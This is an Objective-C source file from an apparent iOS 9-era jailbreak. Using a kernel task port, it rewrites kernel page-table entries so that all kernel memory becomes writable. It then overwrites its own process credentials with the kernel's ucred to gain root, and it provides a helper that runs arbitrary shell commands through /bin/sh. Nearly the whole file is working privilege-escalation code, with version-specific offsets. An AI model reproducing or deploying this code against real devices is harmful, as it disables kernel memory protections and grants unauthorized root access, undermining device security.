//kpmap patch from jk

#import <Foundation/Foundation.h>
#include <mach/mach.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <UIKit/UIKit.h>
#include <sys/mount.h>
#include <spawn.h>
#include <copyfile.h>
#include <sys/sysctl.h>
#include <sys/stat.h>
#include "../jailbreak.h"

#define TTB_SIZE			4096
#define L1_SECT_S_BIT		(1 << 16)
#define L1_SECT_PROTO		(1 << 1)														/* 0b10 */
#define L1_SECT_AP_URW		(1 << 10) | (1 << 11)
#define L1_SECT_APX			(1 << 15)
#define L1_SECT_DEFPROT		(L1_SECT_AP_URW | L1_SECT_APX)
#define L1_SECT_SORDER		(0)																/* 0b00, not cacheable, strongly ordered. */
#define L1_SECT_DEFCACHE	(L1_SECT_SORDER)
#define L1_PROTO_TTE(entry)	(entry | L1_SECT_S_BIT | L1_SECT_DEFPROT | L1_SECT_DEFCACHE)

uint32_t pmaps[TTB_SIZE];
int pmapscnt = 0;

void patch_kernel_pmap(task_t tfp0, uintptr_t kernel_base) {
	uint32_t kernel_pmap		= find_kernel_pmap(kernel_base);
	uint32_t kernel_pmap_store	= kread_uint32(kernel_pmap,tfp0);
	uint32_t tte_virt			= kread_uint32(kernel_pmap_store,tfp0);
	uint32_t tte_phys			= kread_uint32(kernel_pmap_store+4,tfp0);
	
	olog("kernel pmap store @ 0x%08x\n",
			kernel_pmap_store);
	olog("kernel pmap tte is at VA 0x%08x PA 0x%08x\n",
			tte_virt,
			tte_phys);
	
	/*
	 *  every page is writable
	 */
	uint32_t i;
	for (i = 0; i < TTB_SIZE; i++) {
		uint32_t addr   = tte_virt + (i << 2);
		uint32_t entry  = kread_uint32(addr,tfp0);
		if (entry == 0) continue;
		if ((entry & 0x3) == 1) {
			/*
			 *  if the 2 lsb are 1 that means there is a second level
			 *  pagetable that we need to give readwrite access to.
			 *  zero bytes 0-10 to get the pagetable address
			 */
			uint32_t second_level_page_addr = (entry & (~0x3ff)) - tte_phys + tte_virt;
			for (int i = 0; i < 256; i++) {
				/*
				 *  second level pagetable has 256 entries, we need to patch all
				 *  of them
				 */
				uint32_t sladdr  = second_level_page_addr+(i<<2);
				uint32_t slentry = kread_uint32(sladdr,tfp0);
				
				if (slentry == 0)
					continue;
				
				/*
				 *  set the 9th bit to zero
				 */
				uint32_t new_entry = slentry & (~0x200);
				if (slentry != new_entry) {
					kwrite_uint32(sladdr, new_entry,tfp0);
					pmaps[pmapscnt++] = sladdr;
				}
			}
			continue;
		}
		
		if ((entry & L1_SECT_PROTO) == 2) {
			uint32_t new_entry  =  L1_PROTO_TTE(entry);
			new_entry		   &= ~L1_SECT_APX;
			kwrite_uint32(addr, new_entry,tfp0);
		}
	}
	
	olog("every page is actually writable\n");
	usleep(100000);
}

void pmap_unpatch(task_t tfp0) {
	while (pmapscnt > 0) {
		uint32_t sladdr  = pmaps[--pmapscnt];
		uint32_t slentry = kread_uint32(sladdr,tfp0);
		
		/*
		 *  set the 9th bit to one
		 */
		uint32_t new_entry = slentry | (0x200);
		kwrite_uint32(sladdr, new_entry,tfp0);
	}
}

bool is_pmap_patch_success(task_t tfp0, uintptr_t kernel_base, uintptr_t kaslr_slide) {
    
    patch_kernel_pmap(tfp0, kernel_base);
    
    uint32_t before = -1;
    uint32_t after = -1;
    
    olog("check pmap patch\n");
    
    before = kread_uint32(kernel_base, tfp0);
    kwrite_uint32(kernel_base, 0x41414141, tfp0);
    after = kread_uint32(kernel_base, tfp0);
    kwrite_uint32(kernel_base, before, tfp0);
    
    if ((before != after) && (after == 0x41414141)) {
        olog("pmap patched!\n");
    } else {
        olog("pmap patch failed\n");
        return false;
    }
    return true;
}

bool rootify(task_t tfp0, uintptr_t kernel_base, uintptr_t kaslr_slide){
    olog("stealing kernel creds\n");
    
    uint32_t proc = kread_uint32(kernel_base + hardcoded_allproc(), tfp0);
    olog("uint32_t allproc at 0x%08lx\n",kernel_base + hardcoded_allproc());
    
    uint32_t myproc = 0;
    uint32_t kernproc = 0;
    
    //thanks to Jake James for his rootlessJB writeup, plus spv. this was already in 9.3.5fun and while i can easily redo this to be my own eh I'm lazy and spv's works fine.
    if (proc != 0) {
        while ((myproc == 0) || (kernproc == 0)) {
            uint32_t kpid = kread_uint32(proc + 8, tfp0); //go to next process
            if (kpid == getpid()) {
                myproc = proc;
                olog("found myproc 0x%08x, %d\n", myproc, kpid);
            } else if (kpid == 0) {
                kernproc = proc;
                olog("found kernproc 0x%08x, %d\n", kernproc, kpid);
            }
            proc = kread_uint32(proc, tfp0);
        }
    } else {
        // fail
        return false;
    }
    
    uint32_t proc_ucred_offset;
    if ([[NSArray arrayWithObjects:@"3248.61.1~1",@"3248.60.9~1",@"3248.60.8~1",@"3248.60.4~1",@"3248.60.3~3",@"3248.50.21~4",@"3248.50.20~1",@"3248.50.18~1",@"3248.41.4~2",@"3248.41.4~3",@"3248.41.3~1",@"3248.40.173.0.1~1",@"3248.40.166.0.1~1",@"3248.40.155.1.1~3", nil] containsObject:KernelVersion()]) { //9.3b1-9.3.6
        proc_ucred_offset = 0xa4;
        olog("using 0xa4\n");
    } else if ([[NSArray arrayWithObjects:@"3248.31.3~2",@"3248.21.2~1",@"3248.21.1~2",@"3248.20.39~8",@"3248.20.33.0.1~7",@"3248.10.42~4",@"3248.10.41~1",@"3248.10.38~3",@"3248.10.27~1",@"3789.70.16~4", nil] containsObject:KernelVersion()]){ //9.1b1-9.2.1 & 10.3.3
        proc_ucred_offset = 0x98;
        olog("using 0x98\n");
    } else { //iOS 9.0b1-9.0.2 (and I think 8.4.1 too)
        proc_ucred_offset = 0x8c;
        olog("using 0x8c\n");
    }
    
    uint32_t kern_ucred = kread_uint32(kernproc + proc_ucred_offset, tfp0);
    olog("uint32_t kern_ucred at 0x%08x\n", kern_ucred);
    
    vm_write(tfp0,myproc + proc_ucred_offset,(vm_offset_t)&kern_ucred,4); //patch our ucred with kern ucred
    
    setuid(0);
    
    olog("got root\n");
    
    return true;

}

extern char **environ;

//eh fuck it I'm lazy, later in a future build this won't be used
void run_cmd(char *cmd, ...) {
	pid_t pid;
	va_list ap;
	char* cmd_ = NULL;
	
	va_start(ap, cmd);
	vasprintf(&cmd_, cmd, ap);
	
	char *argv[] = {"sh", "-c", cmd_, NULL};
	
	int status;
	olog("Run command: %s", cmd_);
	status = posix_spawn(&pid, "/bin/sh", NULL, NULL, argv, environ);
	if (status == 0) {
		olog("Child pid: %i", pid);
		do {
			if (waitpid(pid, &status, 0) != -1) {
				olog("Child status %d", WEXITSTATUS(status));
			} else {
				perror("waitpid");
			}
		} while (!WIFEXITED(status) && !WIFSIGNALED(status));
	} else {
		olog("posix_spawn: %s", strerror(status));
	}
}
